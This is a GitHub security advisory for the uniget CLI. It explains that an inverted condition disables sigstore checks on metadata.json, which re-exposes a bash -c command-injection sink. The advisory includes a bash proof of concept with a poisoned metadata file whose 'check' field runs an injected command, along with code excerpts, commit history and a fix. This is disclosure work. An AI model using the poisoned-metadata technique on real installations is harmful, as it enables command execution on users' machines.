# [H] uniget CLI: Metadata signature verification only runs when UNIGET_IGNORE_METADATA_SIGNATURE is set

## Summary
Severity: High
Advisory: GHSA-fhgh-wq4q-r37x
CWE: CWE-347, CWE-78
Ecosystem: Go
CVSS: CVSS:3.1/AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-08-17
Source: https://github.com/advisories/GHSA-fhgh-wq4q-r37x
Type: github-advisory

## Affected
- Go: `gitlab.com/uniget-org/cli` — affected >=0.27.4 <0.28.9

## Details
## Summary

The sigstore check on `metadata.json` is gated on the wrong side of the condition. `LoadMetadata` in `internal/config/update.go:81` verifies the bundle only when `UNIGET_IGNORE_METADATA_SIGNATURE` is non-empty, so in a normal run, where nobody sets that variable, the signature is never checked. Setting the variable that is named "ignore the signature" is what turns verification on.

That matters because `metadata.json` populates `Tool.Check`, and `pkg/tool/tool.go:250` runs `Tool.Check` through `/bin/bash -c`. That is the same sink as CVE-2026-45152, and the signature check added in v0.27.1 to close it is the control that no longer runs.

## Where it is

`internal/config/update.go:80-100`:

```go
func (c *Config) LoadMetadata(filename string) (loadedTools *tool.Tools, err error) {
	if len(os.Getenv("UNIGET_IGNORE_METADATA_SIGNATURE")) > 0 {
		_, err = security.VerifySigstoreBundle(
			filename,
			filename+".sigstore.json",
			...
		)
		if err != nil {
			return nil, fmt.Errorf("error verifying sigstore bundle for metadata: %s", err)
		}
	}

	loadedTools, err = tool.LoadFromFile(filename)
```

`cmd/uniget/main.go:102-105` carries the same flipped condition in the decision about whether to re-download metadata:

```go
if !myos.FileExists(configuration.Prefix+"/"+configuration.GetMetadataFile()) ||
	configuration.AutoUpdate ||
	(len(os.Getenv("UNIGET_IGNORE_METADATA_SIGNATURE")) > 0 &&
		!myos.FileExists(configuration.Prefix+"/"+configuration.GetMetadataFile()+".sigstore.json")) {
```

so a cached `metadata.json` with no `.sigstore.json` beside it is not refetched either, as long as the variable is unset.

`LoadMetadata` is called from `cmd/uniget/main.go:115` in the persistent pre-run, which means every subcommand loads metadata this way. The sink is `pkg/tool/tool.go:248-251`:

```go
func (tool *Tool) RunVersionCheck() (string, error) {
	logging.Tracef("Running version check for %s: %s", tool.Name, tool.Check)
	cmd := exec.Command("/bin/bash", "-c", tool.Check+" | tr -d '\n'")
```

## How it got this way

The check was introduced correctly. In d12ef12c ("fix: Only accept signed metadata", released as v0.27.1) `VerifySigstoreBundle` was called unconditionally. 370d0155 then wrapped it in `if os.Getenv("UNIGET_IGNORE_METADATA_SIGNATURE") != "true"`, which is still the right polarity. b68a27d5 ("fix: Accept any non-empty value"), which is the commit tagged v0.27.4, rewrote that as `if len(os.Getenv("UNIGET_IGNORE_METADATA_SIGNATURE")) > 0`. The intent was clearly to accept any truthy value instead of the literal string "true", but the negation was dropped in the rewrite and the meaning flipped.

## Proof of concept

Built from a clean checkout of the v0.28.2 tag with `go build -o /tmp/unigetbin ./cmd/uniget`, then run in user mode against a poisoned cache with no `metadata.json.sigstore.json` present and `UNIGET_IGNORE_METADATA_SIGNATURE` explicitly removed from the environment.

```bash
H=/tmp/pochome
mkdir -p $H/.cache/uniget $H/.local/state/uniget/manifests $H/.local/bin $H/.config/uniget $H/.cache/uniget/evil
cat > $H/.cache/uniget/metadata.json <<'EOF'
{"tools":[{"name":"evil","version":"1.0.0","binary":"${target}/bin/evil",
"check":"id > /tmp/uniget-rce-proof.txt; echo PWNED","tags":["test"],
"description":"poisoned metadata","repository":"https://example.com",
"license":{"name":"MIT","link":"https://example.com"},
"sources":[{"registry":"ghcr.io","repository":"uniget-org/tools"}]}]}
EOF
printf '#!/bin/sh\necho 1.0.0\n' > $H/.local/bin/evil; chmod +x $H/.local/bin/evil
touch $H/.cache/uniget/evil/1.0.0

env -u UNIGET_IGNORE_METADATA_SIGNATURE HOME=$H XDG_CACHE_HOME=$H/.cache \
  XDG_STATE_HOME=$H/.local/state XDG_CONFIG_HOME=$H/.config \
  /tmp/unigetbin --user version evil
```

Observed output:

```text
PWNED
```

and `/tmp/uniget-rce-proof.txt` contains the output of `id`. No signature error was raised, even though there is no bundle file at all.

The control run is the part that pins down the polarity. Same command, same poisoned metadata, only now a `metadata.json.sigstore.json` exists (deliberately not a valid bundle) and the "ignore" variable is set:

```bash
echo '{"not":"a real bundle"}' > $H/.cache/uniget/metadata.json.sigstore.json
UNIGET_IGNORE_METADATA_SIGNATURE=1 HOME=$H XDG_CACHE_HOME=$H/.cache \
  XDG_STATE_HOME=$H/.local/state XDG_CONFIG_HOME=$H/.config \
  /tmp/unigetbin --user version evil
```

Observed output:

```text
Error: error loading metadata: error verifying sigstore bundle for metadata: error loading bundle from path /tmp/pochome/.cache/uniget/metadata.json.sigstore.json: proto: (line 1:2): unknown field "not"
```

So verification runs when the ignore variable is set, and does not run when it is unset.

## Impact

Anything that can substitute the metadata layer gets command execution as the user running uniget: a compromised or attacker-chosen registry or mirror for `uniget-org/tools`, a tampered tarball on the way into the cache, or a poisoned cache file. The sigstore bundle is the only thing standing between that metadata and `/bin/bash -c`, and right now it is not consulted. Locally this reproduces the CVE-2026-45152 scenario on a supposedly fixed version; the wider concern is that the supply chain check for the tool catalogue is effectively off for every user.

## Suggested fix

Invert the condition so verification is the default and the environment variable opts out:

```go
if len(os.Getenv("UNIGET_IGNORE_METADATA_SIGNATURE")) == 0 {
	_, err = security.VerifySigstoreBundle(...)
	...
}
```

The same inversion is needed at `cmd/uniget/main.go:104`, where the re-download decision should be "the bundle is missing and we are not ignoring signatures". It would also be worth failing closed when the `.sigstore.json` file is absent rather than treating a missing bundle as nothing to verify.

## Deduplication

CVE-2026-45152 (GHSA-qqq4-5773-pmw5) covers the `tool.Check` command injection itself and is marked patched in v0.27.1. This report is not that finding again: it is that the patch, which was the signature check, stopped running as of v0.27.4 because of the condition rewrite in b68a27d5. The other two published advisories, GHSA-m6jg-wr9m-cg2f and GHSA-qmcq-xw74-w667, are about hook file paths and the EDITOR variable and do not touch metadata loading.

## How I found it and a note on tooling

I was reading the shipped fix for CVE-2026-45152 to see whether the guard covered all the paths that reach `RunVersionCheck`, and the gate condition read backwards on first pass, so I walked the history of that line back to the commit that introduced it. I used AI tooling while investigating, and I built the CLI at v0.28.2 and ran both the exploit and the control myself before writing this up.

## References
- https://github.com/uniget-org/cli/security/advisories/GHSA-fhgh-wq4q-r37x
- https://github.com/uniget-org/cli
- https://github.com/uniget-org/cli/releases/tag/v0.28.9
